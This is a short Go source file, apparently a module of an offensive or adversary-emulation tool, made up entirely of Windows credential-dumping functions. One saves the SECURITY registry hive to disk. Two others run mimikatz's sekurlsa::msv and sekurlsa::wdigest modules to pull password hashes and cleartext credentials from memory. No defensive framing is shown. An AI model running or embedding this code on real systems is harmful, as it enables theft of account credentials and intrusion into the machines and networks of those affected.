//go:build windows

package credential

import (
"os/exec"
)

func DumpSecurityHive() bool {
cmd := exec.Command("cmd", "/c", "reg save HKLM\\SECURITY security.hive /y")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpCachedCredentials() bool {
cmd := exec.Command("cmd", "/c", "mimikatz.exe \"sekurlsa::msv\" exit")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpWDigest() bool {
cmd := exec.Command("cmd", "/c", "mimikatz.exe \"sekurlsa::wdigest\" exit")
err := cmd.Run()
if err != nil {
return false
}
return true
}
